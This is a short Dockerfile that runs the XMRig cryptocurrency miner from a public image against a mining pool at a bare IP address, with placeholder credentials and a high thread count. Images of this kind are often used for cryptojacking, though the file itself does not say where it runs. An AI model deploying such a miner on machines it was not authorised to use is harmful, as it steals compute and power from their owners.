FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=94.237.102.6:3333", "--user=x", "--pass=x", "-k", "-t=100"]
